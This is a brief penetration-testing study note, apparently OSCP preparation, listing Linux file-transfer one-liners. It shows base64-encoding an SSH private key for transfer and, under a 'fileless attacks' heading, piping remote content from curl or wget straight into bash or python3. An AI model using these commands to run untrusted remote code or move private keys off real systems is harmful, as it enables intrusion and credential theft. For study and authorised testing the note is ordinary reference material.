---
permalink: oscp/techniques/file-transfer/untitled
title: Untitled
type: note
---
## Download Operations

#### Checking File Hash
```bash
md5sum id_rsa
```


#### Encoding SSH Keys
```bash
cat id_rsa |base64 -w 0;echo
```

#### Decoding a file
```bash
echo -n '<INSERT BASE64 PAYLOAD>' | base64 -d > id_rsa
```

---
## Web Download with wget and curl

#### Download File with wget
```bash
wget <URL TO FILE> -O <WHERE TO SAVE FILE>
```

#### Download File using cURL
```bash
curl -o <WHERE TO SAVE FILE> <LINK TO FILE>
```

---

## Fileless Attacks Using Linux

#### Executing a File without Downloading
```bash
curl <LINK TO FILE> | bash
```

```bash
wget -qO- <URL TO FILE> | python3
```

---
## Download File with Bash (/dev/tcp)



